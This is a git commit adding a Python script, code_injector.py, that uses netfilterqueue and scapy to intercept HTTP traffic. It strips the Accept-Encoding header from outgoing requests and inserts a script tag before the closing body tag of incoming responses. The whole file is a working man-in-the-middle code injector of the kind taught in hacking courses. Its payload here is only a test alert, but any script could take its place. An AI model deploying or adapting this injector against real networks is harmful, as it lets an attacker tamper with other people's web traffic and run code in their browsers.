899e4d0d25faf1b32836fca44fbf3ffeec695526
bipin <bipinbhattarai125@gmail.com>
2024-10-09 13:51:10 +0545

    making simple code

---
+++ code_injector.py
@@ -0,0 +1,28 @@
+import netfilterqueue
+import scapy.all as scapy
+import re
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet.haslayer(scapy.TCP):
+            load = scapy_packet[scapy.Raw].load
+            if scapy_packet[scapy.TCP].dport == 80:  # Check for outgoing requests
+                print ("[+] Request ")
+                load = re.sub("Accept-Encoding:.*?\\r\\n"," ",load)
+            elif scapy_packet[scapy.TCP].sport == 80:  # Check for incoming responses
+                print("[+] Response ")
+                print(scapy_packet.show())
+                load =load.replace("</body","<script>alert('test');</script></body>")
+            if load != scapy_packet[scapy.Raw].load :
+                new_packet = set_load(scapy_packet,load)
+                packet.set_payload(bytes(new_packet))  # Set the modified packet payload
+    packet.accept()  # Accept the packet
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
